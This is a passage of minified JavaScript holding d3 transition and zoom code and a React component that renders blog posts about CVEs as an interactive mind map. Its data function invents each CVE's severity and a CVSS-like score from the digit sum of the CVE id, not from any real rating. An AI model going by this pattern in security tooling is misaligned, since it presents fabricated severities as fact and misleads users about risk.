s[u]):+u<n&&(v.state=Ar,v.timer.stop(),v.on.call("cancel",e,e.__data__,v.index,v.group),delete s[u])}if(Kc(function(){t.state===Pr&&(t.state=Zc,t.timer.restart(l,t.delay,t.time),l(c))}),t.state=ll,t.on.call("start",e,e.__data__,t.index,t.group),t.state===ll){for(t.state=Pr,r=new Array(f=t.tween.length),u=0,h=-1;u<f;++u)(v=t.tween[u].value.call(e,e.__data__,t.index,t.group))&&(r[++h]=v);r.length=h+1}}function l(c){for(var u=c<t.duration?t.ease.call(null,c/t.duration):(t.timer.restart(o),t.state=ol,1),h=-1,f=r.length;++h<f;)r[h].call(e,u);t.state===ol&&(t.on.call("end",e,e.__data__,t.index,t.group),o())}function o(){t.state=Ar,t.timer.stop(),delete s[n];for(var c in s)return;delete e.__transition}}function Lr(e,n){var t=e.__transition,s,r,i=!0,a;if(t){n=n==null?null:n+"";for(a in t){if((s=t[a]).name!==n){i=!1;continue}r=s.state>ll&&s.state<ol,s.state=Ar,s.timer.stop(),s.on.call(r?"interrupt":"cancel",e,e.__data__,s.index,s.group),delete t[a]}i&&delete e.__transition}}function x0(e){return this.each(function(){Lr(this,e)})}function S0(e,n){var t,s;return function(){var r=sn(this,e),i=r.tween;if(i!==t){s=t=i;for(var a=0,l=s.length;a<l;++a)if(s[a].name===n){s=s.slice(),s.splice(a,1);break}}r.tween=s}}function _0(e,n,t){var s,r;if(typeof t!="function")throw new Error;return function(){var i=sn(this,e),a=i.tween;if(a!==s){r=(s=a).slice();for(var l={name:n,value:t},o=0,c=r.length;o<c;++o)if(r[o].name===n){r[o]=l;break}o===c&&r.push(l)}i.tween=r}}function E0(e,n){var t=this._id;if(e+="",arguments.length<2){for(var s=Ke(this.node(),t).tween,r=0,i=s.length,a;r<i;++r)if((a=s[r]).name===e)return a.value;return null}return this.each((n==null?S0:_0)(t,e,n))}function fo(e,n,t){var s=e._id;return e.each(function(){var r=sn(this,s);(r.value||(r.value={}))[n]=t.apply(this,arguments)}),function(r){return Ke(r,s).value[n]}}function Yd(e,n){var t;return(typeof n=="number"?Sn:n instanceof Ds?Gc:(t=Ds(n))?(n=t,Gc):a0)(e,n)}function T0(e){return function(){this.removeAttribute(e)}}function C0(e){return function(){this.removeAttributeNS(e.space,e.local)}}function P0(e,n,t){var s,r=t+"",i;return function(){var a=this.getAttribute(e);return a===r?null:a===s?i:i=n(s=a,t)}}function A0(e,n,t){var s,r=t+"",i;return function(){var a=this.getAttributeNS(e.space,e.local);return a===r?null:a===s?i:i=n(s=a,t)}}function L0(e,n,t){var s,r,i;return function(){var a,l=t(this),o;return l==null?void this.removeAttribute(e):(a=this.getAttribute(e),o=l+"",a===o?null:a===s&&o===r?i:(r=o,i=n(s=a,l)))}}function N0(e,n,t){var s,r,i;return function(){var a,l=t(this),o;return l==null?void this.removeAttributeNS(e.space,e.local):(a=this.getAttributeNS(e.space,e.local),o=l+"",a===o?null:a===s&&o===r?i:(r=o,i=n(s=a,l)))}}function R0(e,n){var t=Ei(e),s=t==="transform"?u0:Yd;return this.attrTween(e,typeof n=="function"?(t.local?N0:L0)(t,s,fo(this,"attr."+e,n)):n==null?(t.local?C0:T0)(t):(t.local?A0:P0)(t,s,n))}function O0(e,n){return function(t){this.setAttribute(e,n.call(this,t))}}function M0(e,n){return function(t){this.setAttributeNS(e.space,e.local,n.call(this,t))}}function I0(e,n){var t,s;function r(){var i=n.apply(this,arguments);return i!==s&&(t=(s=i)&&M0(e,i)),t}return r._value=n,r}function z0(e,n){var t,s;function r(){var i=n.apply(this,arguments);return i!==s&&(t=(s=i)&&O0(e,i)),t}return r._value=n,r}function D0(e,n){var t="attr."+e;if(arguments.length<2)return(t=this.tween(t))&&t._value;if(n==null)return this.tween(t,null);if(typeof n!="function")throw new Error;var s=Ei(e);return this.tween(t,(s.local?I0:z0)(s,n))}function j0(e,n){return function(){ho(this,e).delay=+n.apply(this,arguments)}}function B0(e,n){return n=+n,function(){ho(this,e).delay=n}}function F0(e){var n=this._id;return arguments.length?this.each((typeof e=="function"?j0:B0)(n,e)):Ke(this.node(),n).delay}function U0(e,n){return function(){sn(this,e).duration=+n.apply(this,arguments)}}function H0(e,n){return n=+n,function(){sn(this,e).duration=n}}function V0(e){var n=this._id;return arguments.length?this.each((typeof e=="function"?U0:H0)(n,e)):Ke(this.node(),n).duration}function W0(e,n){if(typeof n!="function")throw new Error;return function(){sn(this,e).ease=n}}function $0(e){var n=this._id;return arguments.length?this.each(W0(n,e)):Ke(this.node(),n).ease}function G0(e,n){return function(){var t=n.apply(this,arguments);if(typeof t!="function")throw new Error;sn(this,e).ease=t}}function q0(e){if(typeof e!="function")throw new Error;return this.each(G0(this._id,e))}function Y0(e){typeof e!="function"&&(e=Pd(e));for(var n=this._groups,t=n.length,s=new Array(t),r=0;r<t;++r)for(var i=n[r],a=i.length,l=s[r]=[],o,c=0;c<a;++c)(o=i[c])&&e.call(o,o.__data__,c,i)&&l.push(o);return new yn(s,this._parents,this._name,this._id)}function X0(e){if(e._id!==this._id)throw new Error;for(var n=this._groups,t=e._groups,s=n.length,r=t.length,i=Math.min(s,r),a=new Array(s),l=0;l<i;++l)for(var o=n[l],c=t[l],u=o.length,h=a[l]=new Array(u),f,v=0;v<u;++v)(f=o[v]||c[v])&&(h[v]=f);for(;l<s;++l)a[l]=n[l];return new yn(a,this._parents,this._name,this._id)}function K0(e){return(e+"").trim().split(/^|\s+/).every(function(n){var t=n.indexOf(".");return t>=0&&(n=n.slice(0,t)),!n||n==="start"})}function Q0(e,n,t){var s,r,i=K0(n)?ho:sn;return function(){var a=i(this,e),l=a.on;l!==s&&(r=(s=l).copy()).on(n,t),a.on=r}}function Z0(e,n){var t=this._id;return arguments.length<2?Ke(this.node(),t).on.on(e):this.each(Q0(t,e,n))}function J0(e){return function(){var n=this.parentNode;for(var t in this.__transition)if(+t!==e)return;n&&n.removeChild(this)}}function ew(){return this.on("end.remove",J0(this._id))}function nw(e){var n=this._name,t=this._id;typeof e!="function"&&(e=oo(e));for(var s=this._groups,r=s.length,i=new Array(r),a=0;a<r;++a)for(var l=s[a],o=l.length,c=i[a]=new Array(o),u,h,f=0;f<o;++f)(u=l[f])&&(h=e.call(u,u.__data__,f,l))&&("__data__"in u&&(h.__data__=u.__data__),c[f]=h,Ci(c[f],n,t,f,c,Ke(u,t)));return new yn(i,this._parents,n,t)}function tw(e){var n=this._name,t=this._id;typeof e!="function"&&(e=Cd(e));for(var s=this._groups,r=s.length,i=[],a=[],l=0;l<r;++l)for(var o=s[l],c=o.length,u,h=0;h<c;++h)if(u=o[h]){for(var f=e.call(u,u.__data__,h,o),v,b=Ke(u,t),g=0,x=f.length;g<x;++g)(v=f[g])&&Ci(v,n,t,g,f,b);i.push(f),a.push(u)}return new yn(i,a,n,t)}var sw=Gs.prototype.constructor;function rw(){return new sw(this._groups,this._parents)}function iw(e,n){var t,s,r;return function(){var i=Bt(this,e),a=(this.style.removeProperty(e),Bt(this,e));return i===a?null:i===t&&a===s?r:r=n(t=i,s=a)}}function Xd(e){return function(){this.style.removeProperty(e)}}function aw(e,n,t){var s,r=t+"",i;return function(){var a=Bt(this,e);return a===r?null:a===s?i:i=n(s=a,t)}}function lw(e,n,t){var s,r,i;return function(){var a=Bt(this,e),l=t(this),o=l+"";return l==null&&(o=l=(this.style.removeProperty(e),Bt(this,e))),a===o?null:a===s&&o===r?i:(r=o,i=n(s=a,l))}}function ow(e,n){var t,s,r,i="style."+n,a="end."+i,l;return function(){var o=sn(this,e),c=o.on,u=o.value[i]==null?l||(l=Xd(n)):void 0;(c!==t||r!==u)&&(s=(t=c).copy()).on(a,r=u),o.on=s}}function cw(e,n,t){var s=(e+="")=="transform"?c0:Yd;return n==null?this.styleTween(e,iw(e,s)).on("end.style."+e,Xd(e)):typeof n=="function"?this.styleTween(e,lw(e,s,fo(this,"style."+e,n))).each(ow(this._id,e)):this.styleTween(e,aw(e,s,n),t).on("end.style."+e,null)}function uw(e,n,t){return function(s){this.style.setProperty(e,n.call(this,s),t)}}function pw(e,n,t){var s,r;function i(){var a=n.apply(this,arguments);return a!==r&&(s=(r=a)&&uw(e,a,t)),s}return i._value=n,i}function dw(e,n,t){var s="style."+(e+="");if(arguments.length<2)return(s=this.tween(s))&&s._value;if(n==null)return this.tween(s,null);if(typeof n!="function")throw new Error;return this.tween(s,pw(e,n,t??""))}function hw(e){return function(){this.textContent=e}}function fw(e){return function(){var n=e(this);this.textContent=n??""}}function mw(e){return this.tween("text",typeof e=="function"?fw(fo(this,"text",e)):hw(e==null?"":e+""))}function gw(e){return function(n){this.textContent=e.call(this,n)}}function yw(e){var n,t;function s(){var r=e.apply(this,arguments);return r!==t&&(n=(t=r)&&gw(r)),n}return s._value=e,s}function vw(e){var n="text";if(arguments.length<1)return(n=this.tween(n))&&n._value;if(e==null)return this.tween(n,null);if(typeof e!="function")throw new Error;return this.tween(n,yw(e))}function ww(){for(var e=this._name,n=this._id,t=Kd(),s=this._groups,r=s.length,i=0;i<r;++i)for(var a=s[i],l=a.length,o,c=0;c<l;++c)if(o=a[c]){var u=Ke(o,n);Ci(o,e,t,c,a,{time:u.time+u.delay+u.duration,delay:0,duration:u.duration,ease:u.ease})}return new yn(s,this._parents,e,t)}function kw(){var e,n,t=this,s=t._id,r=t.size();return new Promise(function(i,a){var l={value:a},o={value:function(){--r===0&&i()}};t.each(function(){var c=sn(this,s),u=c.on;u!==e&&(n=(e=u).copy(),n._.cancel.push(l),n._.interrupt.push(l),n._.end.push(o)),c.on=n}),r===0&&i()})}var bw=0;function yn(e,n,t,s){this._groups=e,this._parents=n,this._name=t,this._id=s}function Kd(){return++bw}var an=Gs.prototype;yn.prototype={constructor:yn,select:nw,selectAll:tw,selectChild:an.selectChild,selectChildren:an.selectChildren,filter:Y0,merge:X0,selection:rw,transition:ww,call:an.call,nodes:an.nodes,node:an.node,size:an.size,empty:an.empty,each:an.each,on:Z0,attr:R0,attrTween:D0,style:cw,styleTween:dw,text:mw,textTween:vw,remove:ew,tween:E0,delay:F0,duration:V0,ease:$0,easeVarying:q0,end:kw,[Symbol.iterator]:an[Symbol.iterator]};function xw(e){return((e*=2)<=1?e*e*e:(e-=2)*e*e+2)/2}var Sw={time:null,delay:0,duration:250,ease:xw};function _w(e,n){for(var t;!(t=e.__transition)||!(t=t[n]);)if(!(e=e.parentNode))throw new Error(`transition ${n} not found`);return t}function Ew(e){var n,t;e instanceof yn?(n=e._id,e=e._name):(n=Kd(),(t=Sw).time=po(),e=e==null?null:e+"");for(var s=this._groups,r=s.length,i=0;i<r;++i)for(var a=s[i],l=a.length,o,c=0;c<l;++c)(o=a[c])&&Ci(o,e,n,c,a,t||_w(o,n));return new yn(s,this._parents,e,n)}Gs.prototype.interrupt=x0;Gs.prototype.transition=Ew;const fr=e=>()=>e;function Tw(e,{sourceEvent:n,target:t,transform:s,dispatch:r}){Object.defineProperties(this,{type:{value:e,enumerable:!0,configurable:!0},sourceEvent:{value:n,enumerable:!0,configurable:!0},target:{value:t,enumerable:!0,configurable:!0},transform:{value:s,enumerable:!0,configurable:!0},_:{value:r}})}function pn(e,n,t){this.k=e,this.x=n,this.y=t}pn.prototype={constructor:pn,scale:function(e){return e===1?this:new pn(this.k*e,this.x,this.y)},translate:function(e,n){return e===0&n===0?this:new pn(this.k,this.x+this.k*e,this.y+this.k*n)},apply:function(e){return[e[0]*this.k+this.x,e[1]*this.k+this.y]},applyX:function(e){return e*this.k+this.x},applyY:function(e){return e*this.k+this.y},invert:function(e){return[(e[0]-this.x)/this.k,(e[1]-this.y)/this.k]},invertX:function(e){return(e-this.x)/this.k},invertY:function(e){return(e-this.y)/this.k},rescaleX:function(e){return e.copy().domain(e.range().map(this.invertX,this).map(e.invert,e))},rescaleY:function(e){return e.copy().domain(e.range().map(this.invertY,this).map(e.invert,e))},toString:function(){return"translate("+this.x+","+this.y+") scale("+this.k+")"}};var mo=new pn(1,0,0);pn.prototype;function ra(e){e.stopImmediatePropagation()}function es(e){e.preventDefault(),e.stopImmediatePropagation()}function Cw(e){return(!e.ctrlKey||e.type==="wheel")&&!e.button}function Pw(){var e=this;return e instanceof SVGElement?(e=e.ownerSVGElement||e,e.hasAttribute("viewBox")?(e=e.viewBox.baseVal,[[e.x,e.y],[e.x+e.width,e.y+e.height]]):[[0,0],[e.width.baseVal.value,e.height.baseVal.value]]):[[0,0],[e.clientWidth,e.clientHeight]]}function Jc(){return this.__zoom||mo}function Aw(e){return-e.deltaY*(e.deltaMode===1?.05:e.deltaMode?1:.002)*(e.ctrlKey?10:1)}function Lw(){return navigator.maxTouchPoints||"ontouchstart"in this}function Nw(e,n,t){var s=e.invertX(n[0][0])-t[0][0],r=e.invertX(n[1][0])-t[1][0],i=e.invertY(n[0][1])-t[0][1],a=e.invertY(n[1][1])-t[1][1];return e.translate(r>s?(s+r)/2:Math.min(0,s)||Math.max(0,r),a>i?(i+a)/2:Math.min(0,i)||Math.max(0,a))}function Rw(){var e=Cw,n=Pw,t=Nw,s=Aw,r=Lw,i=[0,1/0],a=[[-1/0,-1/0],[1/0,1/0]],l=250,o=f0,c=lo("start","zoom","end"),u,h,f,v=500,b=150,g=0,x=10;function p(k){k.property("__zoom",Jc).on("wheel.zoom",N,{passive:!1}).on("mousedown.zoom",B).on("dblclick.zoom",D).filter(r).on("touchstart.zoom",Z).on("touchmove.zoom",ge).on("touchend.zoom touchcancel.zoom",Ie).style("-webkit-tap-highlight-color","rgba(0,0,0,0)")}p.transform=function(k,M,C,I){var _=k.selection?k.selection():k;_.property("__zoom",Jc),k!==_?S(k,M,C,I):_.interrupt().each(function(){T(this,arguments).event(I).start().zoom(null,typeof M=="function"?M.apply(this,arguments):M).end()})},p.scaleBy=function(k,M,C,I){p.scaleTo(k,function(){var _=this.__zoom.k,L=typeof M=="function"?M.apply(this,arguments):M;return _*L},C,I)},p.scaleTo=function(k,M,C,I){p.transform(k,function(){var _=n.apply(this,arguments),L=this.__zoom,R=C==null?w(_):typeof C=="function"?C.apply(this,arguments):C,z=L.invert(R),j=typeof M=="function"?M.apply(this,arguments):M;return t(m(d(L,j),R,z),_,a)},C,I)},p.translateBy=function(k,M,C,I){p.transform(k,function(){return t(this.__zoom.translate(typeof M=="function"?M.apply(this,arguments):M,typeof C=="function"?C.apply(this,arguments):C),n.apply(this,arguments),a)},null,I)},p.translateTo=function(k,M,C,I,_){p.transform(k,function(){var L=n.apply(this,arguments),R=this.__zoom,z=I==null?w(L):typeof I=="function"?I.apply(this,arguments):I;return t(mo.translate(z[0],z[1]).scale(R.k).translate(typeof M=="function"?-M.apply(this,arguments):-M,typeof C=="function"?-C.apply(this,arguments):-C),L,a)},I,_)};function d(k,M){return M=Math.max(i[0],Math.min(i[1],M)),M===k.k?k:new pn(M,k.x,k.y)}function m(k,M,C){var I=M[0]-C[0]*k.k,_=M[1]-C[1]*k.k;return I===k.x&&_===k.y?k:new pn(k.k,I,_)}function w(k){return[(+k[0][0]+ +k[1][0])/2,(+k[0][1]+ +k[1][1])/2]}function S(k,M,C,I){k.on("start.zoom",function(){T(this,arguments).event(I).start()}).on("interrupt.zoom end.zoom",function(){T(this,arguments).event(I).end()}).tween("zoom",function(){var _=this,L=arguments,R=T(_,L).event(I),z=n.apply(_,L),j=C==null?w(z):typeof C=="function"?C.apply(_,L):C,ae=Math.max(z[1][0]-z[0][0],z[1][1]-z[0][1]),W=_.__zoom,ye=typeof M=="function"?M.apply(_,L):M,le=o(W.invert(j).concat(ae/W.k),ye.invert(j).concat(ae/ye.k));return function(pe){if(pe===1)pe=ye;else{var rn=le(pe),Pi=ae/rn[2];pe=new pn(Pi,j[0]-rn[0]*Pi,j[1]-rn[1]*Pi)}R.zoom(null,pe)}})}function T(k,M,C){return!C&&k.__zooming||new P(k,M)}function P(k,M){this.that=k,this.args=M,this.active=0,this.sourceEvent=null,this.extent=n.apply(k,M),this.taps=0}P.prototype={event:function(k){return k&&(this.sourceEvent=k),this},start:function(){return++this.active===1&&(this.that.__zooming=this,this.emit("start")),this},zoom:function(k,M){return this.mouse&&k!=="mouse"&&(this.mouse[1]=M.invert(this.mouse[0])),this.touch0&&k!=="touch"&&(this.touch0[1]=M.invert(this.touch0[0])),this.touch1&&k!=="touch"&&(this.touch1[1]=M.invert(this.touch1[0])),this.that.__zoom=M,this.emit("zoom"),this},end:function(){return--this.active===0&&(delete this.that.__zooming,this.emit("end")),this},emit:function(k){var M=Tn(this.that).datum();c.call(k,this.that,new Tw(k,{sourceEvent:this.sourceEvent,target:p,transform:this.that.__zoom,dispatch:c}),M)}};function N(k,...M){if(!e.apply(this,arguments))return;var C=T(this,M).event(k),I=this.__zoom,_=Math.max(i[0],Math.min(i[1],I.k*Math.pow(2,s.apply(this,arguments)))),L=$n(k);if(C.wheel)(C.mouse[0][0]!==L[0]||C.mouse[0][1]!==L[1])&&(C.mouse[1]=I.invert(C.mouse[0]=L)),clearTimeout(C.wheel);else{if(I.k===_)return;C.mouse=[L,I.invert(L)],Lr(this),C.start()}es(k),C.wheel=setTimeout(R,b),C.zoom("mouse",t(m(d(I,_),C.mouse[0],C.mouse[1]),C.extent,a));function R(){C.wheel=null,C.end()}}function B(k,...M){if(f||!e.apply(this,arguments))return;var C=k.currentTarget,I=T(this,M,!0).event(k),_=Tn(k.view).on("mousemove.zoom",j,!0).on("mouseup.zoom",ae,!0),L=$n(k,C),R=k.clientX,z=k.clientY;Uv(k.view),ra(k),I.mouse=[L,this.__zoom.invert(L)],Lr(this),I.start();function j(W){if(es(W),!I.moved){var ye=W.clientX-R,le=W.clientY-z;I.moved=ye*ye+le*le>g}I.event(W).zoom("mouse",t(m(I.that.__zoom,I.mouse[0]=$n(W,C),I.mouse[1]),I.extent,a))}function ae(W){_.on("mousemove.zoom mouseup.zoom",null),Hv(W.view,I.moved),es(W),I.event(W).end()}}function D(k,...M){if(e.apply(this,arguments)){var C=this.__zoom,I=$n(k.changedTouches?k.changedTouches[0]:k,this),_=C.invert(I),L=C.k*(k.shiftKey?.5:2),R=t(m(d(C,L),I,_),n.apply(this,M),a);es(k),l>0?Tn(this).transition().duration(l).call(S,R,I,k):Tn(this).call(p.transform,R,I,k)}}function Z(k,...M){if(e.apply(this,arguments)){var C=k.touches,I=C.length,_=T(this,M,k.changedTouches.length===I).event(k),L,R,z,j;for(ra(k),R=0;R<I;++R)z=C[R],j=$n(z,this),j=[j,this.__zoom.invert(j),z.identifier],_.touch0?!_.touch1&&_.touch0[2]!==j[2]&&(_.touch1=j,_.taps=0):(_.touch0=j,L=!0,_.taps=1+!!u);u&&(u=clearTimeout(u)),L&&(_.taps<2&&(h=j[0],u=setTimeout(function(){u=null},v)),Lr(this),_.start())}}function ge(k,...M){if(this.__zooming){var C=T(this,M).event(k),I=k.changedTouches,_=I.length,L,R,z,j;for(es(k),L=0;L<_;++L)R=I[L],z=$n(R,this),C.touch0&&C.touch0[2]===R.identifier?C.touch0[0]=z:C.touch1&&C.touch1[2]===R.identifier&&(C.touch1[0]=z);if(R=C.that.__zoom,C.touch1){var ae=C.touch0[0],W=C.touch0[1],ye=C.touch1[0],le=C.touch1[1],pe=(pe=ye[0]-ae[0])*pe+(pe=ye[1]-ae[1])*pe,rn=(rn=le[0]-W[0])*rn+(rn=le[1]-W[1])*rn;R=d(R,Math.sqrt(pe/rn)),z=[(ae[0]+ye[0])/2,(ae[1]+ye[1])/2],j=[(W[0]+le[0])/2,(W[1]+le[1])/2]}else if(C.touch0)z=C.touch0[0],j=C.touch0[1];else return;C.zoom("touch",t(m(R,z,j),C.extent,a))}}function Ie(k,...M){if(this.__zooming){var C=T(this,M).event(k),I=k.changedTouches,_=I.length,L,R;for(ra(k),f&&clearTimeout(f),f=setTimeout(function(){f=null},v),L=0;L<_;++L)R=I[L],C.touch0&&C.touch0[2]===R.identifier?delete C.touch0:C.touch1&&C.touch1[2]===R.identifier&&delete C.touch1;if(C.touch1&&!C.touch0&&(C.touch0=C.touch1,delete C.touch1),C.touch0)C.touch0[1]=this.__zoom.invert(C.touch0[0]);else if(C.end(),C.taps===2&&(R=$n(R,this),Math.hypot(h[0]-R[0],h[1]-R[1])<x)){var z=Tn(this).on("dblclick.zoom");z&&z.apply(this,arguments)}}}return p.wheelDelta=function(k){return arguments.length?(s=typeof k=="function"?k:fr(+k),p):s},p.filter=function(k){return arguments.length?(e=typeof k=="function"?k:fr(!!k),p):e},p.touchable=function(k){return arguments.length?(r=typeof k=="function"?k:fr(!!k),p):r},p.extent=function(k){return arguments.length?(n=typeof k=="function"?k:fr([[+k[0][0],+k[0][1]],[+k[1][0],+k[1][1]]]),p):n},p.scaleExtent=function(k){return arguments.length?(i[0]=+k[0],i[1]=+k[1],p):[i[0],i[1]]},p.translateExtent=function(k){return arguments.length?(a[0][0]=+k[0][0],a[1][0]=+k[1][0],a[0][1]=+k[0][1],a[1][1]=+k[1][1],p):[[a[0][0],a[0][1]],[a[1][0],a[1][1]]]},p.constrain=function(k){return arguments.length?(t=k,p):t},p.duration=function(k){return arguments.length?(l=+k,p):l},p.interpolate=function(k){return arguments.length?(o=k,p):o},p.on=function(){var k=c.on.apply(c,arguments);return k===c?p:k},p.clickDistance=function(k){return arguments.length?(g=(k=+k)*k,p):Math.sqrt(g)},p.tapDistance=function(k){return arguments.length?(x=+k,p):x},p}const Ow={cluster:"#c0c0c0",cve:"#d5d5d5"};function Mw({data:e,onSelectCve:n,highlightId:t,hoveredId:s,onHover:r,onFocusPath:i}){const a=E.useRef(null),[l,o]=E.useState(mo),c=E.useMemo(()=>{var P;if(!((P=e==null?void 0:e.children)!=null&&P.length))return{nodes:[],links:[],rooms:[],center:{x:480,y:320},width:960,height:640};const g=960,x=640,p={x:g/2,y:x/2},d=e.children,m=Math.min(g,x)/2-120,w=[],S=[],T=[];return d.forEach((N,B)=>{const D=B/d.length*Math.PI*2,Z=p.x+Math.cos(D)*m,ge=p.y+Math.sin(D)*m,Ie=N.id||N.name||`group-${B}`,k={id:Ie,name:N.name,type:"cluster",x:Z,y:ge,info:N};w.push(k);const M=N.children||[],C=80+Math.min(60,M.length*2);T.push({id:`${Ie}-room`,x:Z,y:ge,r:C+26,glyphR:C+12}),M.forEach((I,_)=>{const L=_/M.length*Math.PI*2,R=Z+Math.cos(L)*C,z=ge+Math.sin(L)*C,j=I.id||`${Ie}-cve-${_}`,ae={id:j,name:I.name||j,type:"cve",x:R,y:z,info:I};w.push(ae),S.push({source:Ie,target:j})})}),{nodes:w,links:S,rooms:T,center:p,width:g,height:x}},[e]),u=E.useMemo(()=>{const g=new Map;return c.nodes.forEach(x=>g.set(x.id,x)),g},[c.nodes]),h=g=>{const x=new Map;c.nodes.filter(m=>m.type==="cve").forEach(m=>{const w=g(m);w&&(x.has(w)||x.set(w,[]),x.get(w).push(m))});const p=[],d=c.center||{x:0,y:0};return x.forEach(m=>{if(m.length<2)return;const w=[...m].sort((T,P)=>{const N=Math.atan2(T.y-d.y,T.x-d.x),B=Math.atan2(P.y-d.y,P.x-d.x);return N-B}),S=Math.min(w.length,8);for(let T=0;T<S-1;T++){const P=w[T],N=w[T+1];p.push({source:P.id,target:N.id,wiggle:22+Math.random()*26,dash:12+Math.random()*10})}w.length>3&&p.push({source:w[0].id,target:w[w.length-1].id,wiggle:18+Math.random()*20,dash:10+Math.random()*10})}),p},f=E.useMemo(()=>h(g=>{var x;return((x=g.info)==null?void 0:x.year)||"Unknown"}),[c.nodes,c.center]),v=E.useMemo(()=>h(g=>{var x;return((x=g.info)==null?void 0:x.severity)||"Info"}),[c.nodes,c.center]);E.useEffect(()=>{if(!t||!e)return;const g=[],x=(p,d)=>{const m=p.id||p.name,w=[...d,p.name];if((m==null?void 0:m.toLowerCase())===t.toLowerCase())return g.push(...w),!0;if(!p.children)return!1;for(const S of p.children)if(x(S,w))return!0;return!1};x(e,[]),g.length&&(i==null||i(g))},[t,e,i]),E.useEffect(()=>{const g=Tn(a.current),x=Rw().scaleExtent([.6,2.5]).on("zoom",p=>o(p.transform));return g.call(x),()=>g.on(".zoom",null)},[]);const b=g=>{g.type==="cve"&&(n==null||n(g.info))};return y.jsx("div",{className:"cve-mindmap",children:y.jsxs("svg",{ref:a,viewBox:"0 0 960 640",role:"presentation",children:[y.jsx("defs",{children:y.jsxs("filter",{id:"glow",children:[y.jsx("feGaussianBlur",{stdDeviation:"2.5",result:"coloredBlur"}),y.jsxs("feMerge",{children:[y.jsx("feMergeNode",{in:"coloredBlur"}),y.jsx("feMergeNode",{in:"SourceGraphic"})]})]})}),y.jsxs("g",{transform:`translate(${l.x},${l.y}) scale(${l.k})`,children:[c.rooms.map(g=>y.jsxs("g",{className:"mindmap-room",children:[y.jsx("circle",{cx:g.x,cy:g.y,r:g.r,fill:"rgba(255,255,255,0.02)",stroke:"rgba(200,200,200,0.08)",strokeWidth:"1.2"}),y.jsx("g",{className:"glyph-ring","transform-origin":`${g.x} ${g.y}`,children:Array.from({length:12}).map((x,p)=>{const d=p/12*Math.PI*2,m=g.glyphR,w=m+8,S=g.x+Math.cos(d)*m,T=g.y+Math.sin(d)*m,P=g.x+Math.cos(d)*w,N=g.y+Math.sin(d)*w;return y.jsx("line",{x1:S,y1:T,x2:P,y2:N,stroke:"rgba(200,200,200,0.4)",strokeWidth:p%3===0?1.3:.7,opacity:.7},`${g.id}-tick-${p}`)})})]},g.id)),f.map((g,x)=>{const p=u.get(g.source),d=u.get(g.target);if(!p||!d)return null;const m=(p.x+d.x)/2,w=(p.y+d.y)/2,S=d.y-p.y,T=p.x-d.x,P=Math.hypot(S,T)||1,N=S/P*g.wiggle,B=T/P*g.wiggle,D=m+N,Z=w+B,ge=s&&(s===g.source||s===g.target);return y.jsx("path",{d:`M ${p.x} ${p.y} Q ${D} ${Z} ${d.x} ${d.y}`,className:`memory-thread${ge?" active":""}`,strokeDasharray:`${g.dash} ${g.dash*1.6}`,style:{animationDelay:`${x*120}ms`}},`thread-year-${x}`)}),v.map((g,x)=>{const p=u.get(g.source),d=u.get(g.target);if(!p||!d)return null;const m=(p.x+d.x)/2,w=(p.y+d.y)/2,S=d.y-p.y,T=p.x-d.x,P=Math.hypot(S,T)||1,N=S/P*g.wiggle*.6,B=T/P*g.wiggle*.6,D=m+N,Z=w+B,ge=s&&(s===g.source||s===g.target);return y.jsx("path",{d:`M ${p.x} ${p.y} Q ${D} ${Z} ${d.x} ${d.y}`,className:`memory-thread severity${ge?" active":""}`,strokeDasharray:`${g.dash} ${g.dash*1.8}`,style:{animationDelay:`${x*140}ms`}},`thread-sev-${x}`)}),c.links.map(g=>{var x,p,d,m;return y.jsx("line",{x1:(x=u.get(g.source))==null?void 0:x.x,y1:(p=u.get(g.source))==null?void 0:p.y,x2:(d=u.get(g.target))==null?void 0:d.x,y2:(m=u.get(g.target))==null?void 0:m.y,stroke:"rgba(180, 180, 180, 0.25)",strokeWidth:s&&(g.source===s||g.target===s)?2.2:1},`${g.source}-${g.target}`)}),c.nodes.map(g=>{var m;const x=g.type==="cve"?11:18,p=t&&((m=g.id)==null?void 0:m.toLowerCase())===t.toLowerCase(),d=Ow[g.type]||"#d5d5d5";return y.jsxs("g",{transform:`translate(${g.x},${g.y})`,className:`mindmap-node ${g.type}`,onClick:()=>b(g),onMouseEnter:()=>{var w;if(r){const[S,T]=l.apply([g.x,g.y]),P=(w=a.current)==null?void 0:w.getBoundingClientRect();r({node:g,screen:{x:P?P.left+S:S,y:P?P.top+T:T}})}},onMouseLeave:()=>r==null?void 0:r(null),style:{cursor:"pointer"},children:[y.jsx("circle",{className:"node-spotlight",r:x+16}),y.jsx("circle",{r:x,fill:d,fillOpacity:p?1:.6,stroke:p?"#d5d5d5":"rgba(255,255,255,0.15)",strokeWidth:p?2:1}),y.jsx("circle",{className:"node-halo",r:x+4})]},g.id)})]})]})})}function Iw(e=[],n="year"){const t=i=>n==="severity"?i.severity||"Info":i.year||"Unknown",s=e.reduce((i,a)=>{const l=t(a);return i[l]||(i[l]=[]),i[l].push(a),i},{}),r=n==="severity"?(i,a)=>i.localeCompare(a):(i,a)=>a.localeCompare(i);return{name:"CVE Map",children:Object.keys(s).sort(r).map(i=>({id:`${n}-${i}`,name:i,nodeType:"cluster",children:s[i].map(a=>({...a,name:a.id||a.title,value:1,nodeType:"cve"}))}))}}function zw(){const[e,n]=E.useState("year"),t=E.useMemo(()=>{const p=S=>S.toUpperCase().includes("CVE"),d=S=>{if(!S)return"Unknown";const P=new Date(S).getFullYear();return Number.isFinite(P)?String(P):"Unknown"},m=S=>{const P=((S||"").match(/\d/g)||[]).reduce((B,D)=>B+Number(D),0),N=["Low","Medium","High","Critical"];return N[P%N.length]},w=S=>S==="Critical"?9.4:S==="High"?8.1:S==="Medium"?6:4;return ao.filter(S=>p(S.title)).map(S=>{const T=S.title.match(/CVE[-–](\d{4})[-–]?([\d]+)/i),P=T?`CVE-${T[1]}-${T[2]}`:S.slug.toUpperCase(),N=m(P);return{id:P,title:S.title,severity:N,cvss:w(N),year:d(S.date),kev:!1,summary:S.excerpt,href:S.href||`/blog/${S.slug}`}})},[]),s=E.useMemo(()=>Iw(t,e),[t,e]),[r,i]=E.useState(null),[a,l]=E.useState([]),[o,c]=E.useState(0),[u,h]=E.useState(null),[f,v]=E.useState(null),[b,g]=E.useState(""),x=p=>{i(p),g((p==null?void 0:p.id)||"")};return y.jsxs("div",{className:"cve-fullscreen",children:[y.jsxs("div",{className:"mindmap-badge","aria-hidden":"true",children:[y.jsx("span",{className:"badge-bracket",children:"["})," CVE MIND MAP ",y.jsx("span",{className:"badge-bracket",children:"]"})]}),y.jsxs("div",{className:"mindmap-stage 